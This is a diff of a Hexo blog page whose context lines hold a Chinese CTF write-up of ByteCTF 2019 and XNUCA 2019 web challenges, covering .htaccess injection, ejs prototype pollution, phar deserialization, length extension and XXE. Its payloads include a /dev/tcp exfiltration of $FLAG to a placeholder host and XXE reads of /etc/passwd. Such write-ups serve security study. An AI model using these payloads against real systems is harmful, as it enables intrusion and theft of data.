@@ -11,21 +11,27 @@
   <link rel="icon" type="image/png" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
   <meta name="description" content="Lethe&#39;s Blog">
   <meta name="author" content="Lethe">
   <meta name="keywords" content="Lethe&#39;s Blog">
-  <title>ByteCTF_2019&amp;XNUCA_2019部分web题复现 ~ Lethe | 忘川</title>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/font-awesome/css/all.min.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/bootstrap/css/bootstrap.min.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/mdbootstrap/css/mdb.min.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/github-markdown/github-markdown.min.css">
-  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
-  
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/prettify/tomorrow-night-eighties.min.css">
-  
-  <link rel="stylesheet" href="/css/main.css">
+  <title>ByteCTF_2019&amp;XNUCA_2019部分web题复现 ~ Lethe&#39;s Blog</title>
 
-  
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.10.2/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.8.9/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
 </head>
 
 
@@ -33,7 +39,7 @@
   <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe | 忘川</strong>&nbsp;</a>
+    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe's Blog</strong>&nbsp;</a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
       <div class="animated-icon"><span></span><span></span><span></span></div>
@@ -45,10 +51,14 @@
         
           
           
+          
+          
           <li class="nav-item">
             <a class="nav-link" href="/">Home</a>
           </li>
         
+          
+          
           
           
           <li class="nav-item">
@@ -57,16 +67,22 @@
         
           
           
+          
+          
           <li class="nav-item">
             <a class="nav-link" href="/categories/">Categories</a>
           </li>
         
           
           
+          
+          
           <li class="nav-item">
             <a class="nav-link" href="/tags/">Tags</a>
           </li>
         
+          
+          
           
           
           <li class="nav-item">
@@ -81,8 +97,6 @@
       </ul>
     </div>
   </div>
-
-
 </nav>
 
     <div class="view intro-2" id="background"
@@ -98,7 +112,39 @@
 
             
               <br>
-              <p class="mt-3">Wednesday, September 11th 2019, 1:06 pm</p>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Wednesday, September 11th 2019, 1:06 pm
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    4.9k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      22 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
             
           </div>
 
@@ -117,7 +163,7 @@
     <div class="d-none d-lg-block col-lg-2"></div>
     <div class="col-lg-8 nopadding-md">
       <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto">
+        <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
             <h1><span id="xnuca-2019-easyphp">XNUCA 2019 EasyPHP</span></h1><pre><code class="php">&lt;?php
     $files = scandir(&#39;./&#39;); 
@@ -168,11 +214,11 @@
 <p>2、发现可以写入php文件但是没有办法解析，于是尝试上传<code>.htaccess</code>文件来设置解析php文件，但是会报500，因为文件结尾被添加了一行无法解析<code>Just one chance</code>内容，我们知道在<code>.htaccess</code>中只有<code>#</code>单行注释符，并没有多行注释符，但是它像大多数语言一样支持用<code>\</code>拼接上下两行，所以可以利用<code># \</code>将最后一行的内容注释掉。</p>
 <p>解决了最后最后一行的问题，但是由于对于<code>content</code>内容的限制，同样没有办法直接设置解析php文件。</p>
 <p>3、观察到文件中有<code>include_once(&quot;fl3g.php&quot;);</code>一句，但是实际上<code>fl3g.php</code>文件已经被删除了，所以肯定有蹊跷… 翻阅php.ini的参数可以看到这个：</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914203024986.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>这个参数可以指定一个目录列表，其中require、include、fopen()、file()、readfile()和file_get_contents()函数在查找要包含的文件时，会分别考虑include路径中的每个条目。它将检查第一个路径，如果没有找到，则检查下一个路径，直到找到包含的文件或返回警告或错误。</p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914203024986.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这个参数可以指定一个目录列表，其中require、include、fopen()、file()、readfile()和file_get_contents()函数在查找要包含的文件时，会分别考虑include路径中的每个条目。它将检查第一个路径，如果没有找到，则检查下一个路径，直到找到包含的文件或返回警告或错误。</p>
 <p>所以想办法在其他目录下写入同名<code>fl3g.php</code>文件，并且里面包含我们的shell，然后通过设置此参数，然该文件可以成功包含<code>fl3g.php</code>从而getshell。</p>
 <p>4、下面就是如何在其他目录下写入文件，且文件名和内容可控，<code>filename</code>参数过滤了<code>/</code>，所以没办法直接通过<code>file_put_contents</code>函数。</p>
 <p>php的配置选项中有<code>error_log</code>可以满足这一点，<code>error_log</code>可以将php运行报错的记录写到指定文件中。</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914204129467.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>正好在文件中会包含一个不存在<code>fl3g.php</code>从而产生报错，所以我们可以把上面说的<code>include_path</code>设置为payload，这样就可以在我们指定的目录下生成文件了。</p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914204129467.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>正好在文件中会包含一个不存在<code>fl3g.php</code>从而产生报错，所以我们可以把上面说的<code>include_path</code>设置为payload，这样就可以在我们指定的目录下生成文件了。</p>
 <p>5、还有一点需要注意，这里写进error_log的内容会被html编码，这里可以使用utf7编码进行绕过。</p>
 <p>在线编码网站：<a href="http://toolswebtop.com/text/process/encode/utf-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode/utf-7</a></p>
 <p>6、步骤</p>
@@ -196,7 +242,7 @@ url = &#39;http://64252b1b-326b-43dd-8dcf-e8afa7dff495.node1.buuoj.cn/&#39;
 r = requests.get(url+&#39;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20&quot;.htaccess&quot;%0AErrorDocument%20404%20&quot;&lt;?php%20system(\&#39;cat%20../../../fl[a]g\&#39;);?&gt;\\&#39;)
 print(r.text)
 </code></pre>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914221142759.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914221142759.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h4><span id="非预期解二">非预期解二</span></h4><p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>，而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code>，因此存在了被绕过的可能。 通过设置<code>.htaccess</code></p>
 <pre><code>php_value pcre.backtrack_limit 0
 php_value pcre.jit 0
@@ -251,7 +297,7 @@ function check() {
 
 check();
 </code></pre>
-<p>我们在题目的环境下简单测试一下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/2019091515505735.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p>我们在题目的环境下简单测试一下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/2019091515505735.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>发现原型链污染可以成功，下面就是寻找可利用的点来进行RCE。</p>
 <p>此题使用使用ejs库作为模版引擎了，看一下<code>ejs.js</code>，发现从572行开始进行了大量的js代码拼接，关键部分如下：</p>
 <pre><code class="javascript">    if (!this.source) {
@@ -317,7 +363,7 @@ if (opts.client) {
 <p>最后生成了一个动态的函数，然后以<code>returned fn</code>返回并被执行。</p>
 <p>所以我们的思路就是覆盖<code>opts.outputFunctionName</code>，这样我们构造的payload就会被拼接进js语句中，并在ejs渲染时进行RCE。</p>
 <p>关于payload的构造，可参考这篇文章：<a href="http://f1sh.site/2019/04/17/node-js-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-cve-2017-16082-%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">node-js-学习笔记</a></p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190915162710452.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>最终payload如下：</p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190915162710452.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>最终payload如下：</p>
 <pre><code class="json">{&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;outputFunctionName&quot;:&quot;a=1;process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;echo $FLAG&gt;/dev/tcp/xxxxx/xxx\&quot;&#39;)//&quot;}}}}
 </code></pre>
 <p>将Content-Type改为json，发包6次触发合并操作，污染原型链，再次访问即可。</p>
@@ -360,7 +406,7 @@ Input Data to Add: Lethe
 ec1b7c99078d6f2be7c25481b53bad40
 admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00Lethe
 </code></pre><p>所以添加Cookie：<code>user=ec1b7c99078d6f2be7c25481b53bad40</code></p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909135910582.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909135910582.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <pre><code>用户名：admin
 密码（将\x替换为%）：admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00Lethe
 </code></pre><p>成功登陆，并可以上传文件。</p>
@@ -377,7 +423,7 @@ admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
         return $res;
     }
 </code></pre>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909140947693.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909140947693.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>再配合上文件上传功能，所以这题整体的思路应该是利用 <strong>phar 反序列化</strong>：</p>
 <ul>
 <li><p>想办法将文件上传到其他目录中（这里因为tmp_name未知，所以无法利用）</p>
@@ -471,13 +517,13 @@ $store_path = $res[&#39;store_path&#39;];
 </code></pre>
 <p>思路到这里貌似卡住了，这个open函数没什么可利用的…</p>
 <p>但是这里<code>$admin</code>我们是可控的，于是可以找一下php里面有没有可以用来删除/重写文件的类，正好存在可利用的同名<code>open()方法</code>，这样我们就可以将<code>$admin</code>实例化为此类的对象。</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145138811.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145138811.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>搜索结果的第一个<code>ZipArchive</code>类就可以利用（<a href="https://www.php.net/manual/en/ziparchive.open.php）" target="_blank" rel="noopener">https://www.php.net/manual/en/ziparchive.open.php）</a></p>
 <p>该类的open方法，使用如下：</p>
 <pre><code class="php">ZipArchive :: open （ string $filename [， int $flags ]）： mixed
 </code></pre>
 <p>第一个参数为文件名，第二个参数可以设置使用的模式。（<a href="https://www.php.net/manual/en/zip.constants.php#ziparchive.constants.overwrite）" target="_blank" rel="noopener">https://www.php.net/manual/en/zip.constants.php#ziparchive.constants.overwrite）</a></p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145636472.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145636472.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>使用上述两个模式并将文件名设为<code>.htaccess</code>的路径，即可删除该文件。</p>
 <p>5、知道整个构造思路了之后，先得到<code>.htaccess</code>文件的路径，并上传一个shell.php如下（使用php可变函数拼接字符绕过过滤），<strong>上传后记下文件路径</strong>：</p>
 <pre><code class="php">//shell.php
@@ -534,7 +580,7 @@ $phar-&gt;stopBuffering();
 <pre><code>view.php?filename=eec2d95bc618625503306c10fad5d37d.phar&amp;filepath=php://filter/resource=phar://sandbox/2ad1c8a81d5d1d24dcac4f7a110a605a/eec2d95bc618625503306c10fad5d37d.phar
 </code></pre><p>即可触发phar反序列化并删除<code>.htaccess</code>文件。</p>
 <p>注意删除后不能再次访问<code>upload.php</code>，否则会再生成.htaccess，直接访问刚才上传shell返回的路径即可RCE。</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909155849502.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909155849502.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="bytectf_2019-boringcode">ByteCTF_2019 BoringCode</span></h1><p>源码如下：</p>
 <pre><code class="php">&lt;?php
@@ -617,7 +663,7 @@ if ($_POST[&#39;code&#39;]){
 </ul>
 <p>但是问题是我们并不能在最后一个函数中使用参数<code>.</code>，所以就得找到一个函数可以不用参数就返回<code>.</code></p>
 <p>存在函数<code>localeconv()</code> ，函数返回一包含本地数字及货币格式信息的数组。</p>
-<p>其返回值如下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190916152254728.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>可以看到第一个正好是我们需要的<code>.</code>，下面就需要将它取出来。</p>
+<p>其返回值如下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190916152254728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>可以看到第一个正好是我们需要的<code>.</code>，下面就需要将它取出来。</p>
 <p>又存在如下限制：</p>
 <pre><code class="php">preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)
 </code></pre>
@@ -642,7 +688,7 @@ if ($_POST[&#39;code&#39;]){
 </code></pre><p>重复发包，当秒数为46时，即可读到flag。</p>
 <p><br></p>
 <h1><span id="rss">rss</span></h1><p>1、进入页面后是一个订阅RSS的功能，限制了域名：</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909170200995.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909170200995.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>2、实际上RSS 是使用 XML 编写，那么就可能存在XXE漏洞。</p>
 <p>参考：<a href="https://mikeknoop.com/lxml-xxe-exploit/" target="_blank" rel="noopener">https://mikeknoop.com/lxml-xxe-exploit/</a></p>
 <p>上面文章中给了一个带有恶意ENTITY标记的RSS有效负载如下：</p>
@@ -669,15 +715,15 @@ if ($_POST[&#39;code&#39;]){
 <p>参考：<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
 <p>因为php是不关心MIME类型的，所以我们可以构造MIME类型来绕过对域名的过滤。</p>
 <p>将上述xml进行base64编码：</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171158259.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171158259.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>所以传入：</p>
 <pre><code>data://baidu.com/plain;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHRpdGxlIFsgPCFFTEVNRU5UIHRpdGxlIEFOWSA+CjwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0+Cjxyc3MgdmVyc2lvbj0iMi4wIiB4bWxuczphdG9tPSJodHRwOi8vd3d3LnczLm9yZy8yMDA1L0F0b20iPgo8Y2hhbm5lbD4KICAgIDx0aXRsZT5UaGUgQmxvZzwvdGl0bGU+CiAgICA8bGluaz5odHRwOi8vZXhhbXBsZS5jb20vPC9saW5rPgogICAgPGRlc2NyaXB0aW9uPkEgYmxvZyBhYm91dCB0aGluZ3M8L2Rlc2NyaXB0aW9uPgogICAgPGxhc3RCdWlsZERhdGU+TW9uLCAwMyBGZWIgMjAxNCAwMDowMDowMCAtMDAwMDwvbGFzdEJ1aWxkRGF0ZT4KICAgIDxpdGVtPgogICAgICAgIDx0aXRsZT4meHhlOzwvdGl0bGU+CiAgICAgICAgPGxpbms+aHR0cDovL2V4YW1wbGUuY29tPC9saW5rPgogICAgICAgIDxkZXNjcmlwdGlvbj5hIHBvc3Q8L2Rlc2NyaXB0aW9uPgogICAgICAgIDxhdXRob3I+YXV0aG9yQGV4YW1wbGUuY29tPC9hdXRob3I+CiAgICAgICAgPHB1YkRhdGU+TW9uLCAwMyBGZWIgMjAxNCAwMDowMDowMCAtMDAwMDwvcHViRGF0ZT4KICAgIDwvaXRlbT4KPC9jaGFubmVsPgo8L3Jzcz4=
 </code></pre><p>可以看到：</p>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171403182.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171403182.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>4、因为不知道路径，我们先读一下源码，用下面的ENTITY替换一下上面payload中的（因为是php文件，所以要base64一下才能读出来）：</p>
 <pre><code class="xml">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;
 </code></pre>
-<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909172410971.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909172410971.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>base解码后得到：</p>
 <pre><code class="php">//index.php
 &lt;?php
@@ -737,20 +783,24 @@ Route::set(&#39;rss_in_order&#39;,function(){
           </div>
           <br>
           <div>
+            <p>
             
-              <p>
+              <span>
                 <i class="iconfont icon-inbox"></i>
                 
                   <a class="hover-with-bg" href="/categories/Writeup">Writeup</a>
                   &nbsp;
                 
-              </p>
+              </span>&nbsp;&nbsp;
             
-            <p>
-              <i class="iconfont icon-tag"></i>
-              
-                <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
-              
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
+                
+              </span>
+            
             </p>
             
               <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
@@ -779,25 +829,28 @@ Route::set(&#39;rss_in_order&#39;,function(){
     
       <br><br>
       
-      <div class="disqus" style="width:100%">
-  <div id="disqus_thread"></div>
-  <script>
-    var disqus_shortname = 'Lethe';
-    var disqus_config = function () {
-      this.page.url = 'https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/';
-      this.page.identifier = '/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/';
-    };
-    (function () {
-      var d = document, s = d.createElement('script');
-      s.type = 'text/javascript';
-      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-      s.setAttribute('data-timestamp', +new Date());
-      (d.head || d.body).appendChild(s);
-    })();
-  </script>
-  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
-      powered by Disqus.</a></noscript>
-</div>
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>
+      var disqus_config = function () {
+        this.page.url = 'https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/';
+        this.page.identifier = '/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/';
+      };
+      var oldLoad = window.onload;
+      window.onload = function () {
+        var d = document, s = d.createElement('script');
+        s.type = 'text/javascript';
+        s.src = '//' + 'Lethe' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      };
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+        powered by Disqus.</a></noscript>
+  </div>
+
+
     
   </div>
 </div>
@@ -835,41 +888,101 @@ Route::set(&#39;rss_in_order&#39;,function(){
 
   <footer class="mt-5">
   <div class="text-center py-3">
-    <!-- <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
     <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a> -->
-    <b>Copyright &copy; 2019.</b><a href="/"><b>Lethe</b></a>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
     <br>
+
     
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
   </div>
 </footer>
 
 <!-- SCRIPTS -->
-<script src="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/jquery/jquery.min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/popper/popper.min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/bootstrap/js/bootstrap.min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/mdbootstrap/js/mdb.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.8.9/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
+
 
   <script src="/js/lazyload.js"></script>
 
 
+
   
-    <script src="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/tocbot/tocbot.min.js"></script>
+    <script src="https://cdn.staticfile.org/tocbot/4.8.0/tocbot.min.js"></script>
   
   <script src="/js/post.js"></script>
 
 
-  <script src="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/prettify/prettify.min.js"></script>
+
+  <script src="https://cdn.staticfile.org/smooth-scroll/16.1.0/smooth-scroll.min.js"></script>
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<!-- Plugins -->
+
+
+  
+    <!-- Baidu Analytics -->
+    <script>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?99792b18d5c4379d7bc5cf4bced8a563";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  <!-- cnzz Analytics -->
+  
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/r298/prettify.min.js"></script>
   <script>
     $(document).ready(function () {
-      $('pre').addClass('prettyprint linenums');
+      $('pre').addClass('prettyprint  ');
       prettyPrint();
     })
   </script>
 
 
-  <script src="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/typed/typed.min.js"></script>
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.10/typed.min.js"></script>
   <script>
     var typed = new Typed('#subtitle', {
       strings: [
@@ -888,7 +1001,8 @@ Route::set(&#39;rss_in_order&#39;,function(){
   </script>
 
 
-  <script src="https://cdn.jsdelivr.net/gh/fluid-dev/hexo-theme-fluid@1.5.1/source/lib/anchor/anchor.min.js"></script>
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.0/anchor.min.js"></script>
   <script>
     anchors.options = {
       placement: "right",
@@ -919,11 +1033,27 @@ Route::set(&#39;rss_in_order&#39;,function(){
 
 
 
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
   <script>
-    if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) || (/Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent))) {
-      $("#background").css("background-attachment", "scroll");
-    }
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
   </script>
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
